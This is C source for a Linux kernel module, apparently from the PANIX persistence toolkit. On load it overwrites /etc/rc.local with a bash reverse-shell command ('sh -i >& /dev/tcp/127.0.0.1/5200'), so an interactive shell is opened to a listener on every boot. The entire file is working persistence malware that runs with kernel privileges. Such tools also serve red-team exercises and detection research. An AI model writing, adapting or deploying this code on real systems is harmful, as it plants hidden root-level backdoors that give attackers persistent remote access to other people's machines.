// SPDX-License-Identifier: GPL-2.0-only
/*
 * https://github.com/Aegrah/PANIX
 */

#define pr_fmt(fmt) "%s: " fmt, __func__

#include <linux/kernel.h>
#include <linux/module.h>

#ifdef DEBUG
#define dbg_print(fmt, ...) pr_info(fmt, ##__VA_ARGS__)
#else
#define dbg_print(fmt, ...) /* No-op */
#endif

static int rc_local(void)
{
	struct file *file;
	char *data =
		"#!/bin/bash\n/bin/bash -c 'sh -i >& /dev/tcp/127.0.0.1/5200 0>&1'\n";
	loff_t pos = 0; // File offset
	ssize_t written;

	// Create or Open the file
	file = filp_open("/etc/rc.local", O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (IS_ERR(file)) {
		dbg_print("Failed to open file");
		return -1;
	}

	// Write data
	written = kernel_write(file, data, strlen(data), &pos);
	if (written < 0) {
		dbg_print("Failed to write file");
		filp_close(file, NULL);
		return -1;
	}

	filp_close(file, NULL);
	return 0;
}

static int __init persistence_init(void)
{
	rc_local();
	dbg_print("persistence loaded\n");
	return 0;
}

static void __exit persistence_exit(void)
{
	pr_info("persistence exit successfully\n");
}

module_init(persistence_init) module_exit(persistence_exit)
	MODULE_AUTHOR("MikeHorn-git");
MODULE_DESCRIPTION("persistence");
MODULE_LICENSE("GPL");
